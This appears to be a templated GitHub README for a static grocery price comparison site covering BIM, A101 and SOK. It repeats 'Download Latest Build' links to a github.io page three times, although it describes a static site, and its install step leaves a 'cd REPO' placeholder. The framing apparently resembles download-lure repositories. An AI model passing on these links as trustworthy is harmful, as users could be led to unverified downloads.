# Aktuel Radar v2026 - grocery price comparison website 2026

> **Aktuel Radar is a browser-based grocery price comparison site that collects current market prices and helps shoppers evaluate products across stores using the latest 2026 build.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/bennettnoahapm6249/aktuel-radar-store-prices?style=flat-square)](https://github.com/bennettnoahapm6249/aktuel-radar-store-prices)

---

<p align="center">
  <a href="https://bennettnoahapm6249.github.io/aktuel-radar-store-prices/">
    <img src="https://img.shields.io/badge/Download-Aktuel%20Radar%20Latest-brightgreen?style=for-the-badge" alt="Download Aktuel Radar">
  </a>
</p>

> **[Download Aktuel Radar v2026](https://bennettnoahapm6249.github.io/aktuel-radar-store-prices/)**

---

[Download Latest Build](https://bennettnoahapm6249.github.io/aktuel-radar-store-prices/)

---

## What Is Aktuel Radar?

Aktuel Radar is a static website focused on comparing grocery prices. It combines market information from sources including BIM, A101, and SOK, allowing visitors to inspect product costs in one place instead of moving between separate store pages.

The interface is intended for both desktop and mobile browsing. Daily pricing updates, product search, market filters, unit-price details, and discount percentages make it easier to scan available offers and identify relevant deals quickly.

---

## Highlights

- Places real product prices from several markets side by side
- Works with price information refreshed on a daily basis
- Provides unit prices to support more meaningful comparisons
- Shows discount percentages when that information is available
- Lets visitors limit results by market
- Includes product search for quicker navigation
- Provides a dark viewing mode
- Uses a mobile-first static HTML layout

---

## Installation

Because Aktuel Radar is a static site, you can open it in a web browser or deploy it through GitHub Pages.

Clone the repository:

git clone https://github.com/bennettnoahapm6249/aktuel-radar-store-prices.git
cd REPO

To inspect the site locally, open its HTML entry file in a browser or run the directory through a basic static web server.

---

## Using the Site

Use the website to examine grocery products and compare their prices between supported markets.

A typical session looks like this:

- Visit the homepage
- Enter a product name in search
- Apply a market filter when necessary
- Compare the displayed unit prices and discount values
- Enable the preferred theme mode

For a self-hosted deployment, upload the static files to GitHub Pages or another static hosting service. The resulting site URL can then be used to open the current build.

---

## Project Configuration

The site's operation is primarily defined by its static files and by the data pipeline responsible for preparing product listings.

When adapting the project, the main areas to inspect are:

- HTML markup controlling the page structure and layout
- Data files containing product and market details
- Scraping and update scripts used to refresh daily prices
- Theme configuration governing dark mode

Keep the expected content structure and data-source format intact when making changes so that product comparisons continue to display properly.

---

## Requirements

- A modern web browser with HTML and CSS support
- Static hosting, for example GitHub Pages
- Internet connectivity for serving or retrieving updated market information
- Space for the generated website files and pricing data
- A process that keeps daily price information up to date

---

## Frequently Asked Questions

**What is the update schedule for prices?**  
The project is organized around price data that is updated daily.

**Are the results searchable and filterable?**  
Yes. The site includes both product search and market-based filtering.

**Can I use the site on a mobile device?**  
Yes. Its layout follows a mobile-first design approach.

**What sources provide the pricing information?**  
The referenced update flow includes market data extraction and automated scraping.

**What is the deployment process?**  
Host the static HTML files with GitHub Pages or another static hosting provider, then access the site through the resulting link.

**How should I investigate old-looking prices?**  
Review the refresh procedure and the scraping source responsible for loading the newest market listings.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
